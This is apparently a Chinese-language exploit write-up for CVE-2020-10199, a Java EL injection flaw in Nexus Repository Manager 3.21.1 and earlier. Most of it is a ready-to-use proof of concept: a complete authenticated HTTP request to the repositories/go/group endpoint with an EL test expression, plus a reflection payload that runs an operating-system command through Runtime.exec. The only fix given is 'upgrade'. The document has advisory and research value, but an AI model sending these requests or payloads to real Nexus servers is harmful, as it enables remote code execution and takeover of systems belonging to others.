### 一 漏洞描述
Nexus 是一个 Maven 的仓库管理系统，它提供了强大的仓库管理、构件搜索等功能，并且可以用来搭建 Maven 仓库私服，在代理远程仓库的同时维护本地仓库，以节省带宽和时间。  
在 Nexus Repository Manager OSS/Pro 3.21.1 及之前的版本中，经过授权认证的攻击者，可以通过 JavaEL 表达式注入造成远程代码执行，获取系统权限。

3月31日的时候Nexus Repository Manager官方发布了CVE-2020-10199，CVE-2020-10204的漏洞公告，两个漏洞均是由Github Secutiry Lab的@pwntester发现的。    
其中CVE-2020-10199在获取到管理员权限后，即可进行远程命令执行。

Nexus Repository Manager OSS/PRo <=3.21.1

### 二 漏洞利用
```
POST /service/rest/beta/repositories/go/group HTTP/1.1
Host: 127.0.0.1:8081
Content-Length: 203
X-Requested-With: XMLHttpRequest
X-Nexus-UI: true
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
NX-ANTI-CSRF-TOKEN: 0.7886248393834028
Content-Type: application/json
Accept: */*
Origin: http://127.0.0.1:8081
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Referer: http://127.0.0.1:8081/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: NX-ANTI-CSRF-TOKEN=0.7886248393834028; NXSESSIONID=cedf848f-d881-4b58-ac24-9e9c3ece40bc
Connection: close

{
  "name": "internal",
  "online": true,
  "storage": {
    "blobStoreName": "default",
    "strictContentTypeValidation": true
  },
  "group": {
    "memberNames": ["$\\A{233*233*233}"]
  }
}
```
其中NXSESSIONID需要更换为账户登录成功之后的ID，该ID存在与Cookie中。  

执行命令payload
`$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch tmp/233')}`

三 漏洞修复
升级

> 参考链接  
> https://www.modb.pro/db/75743
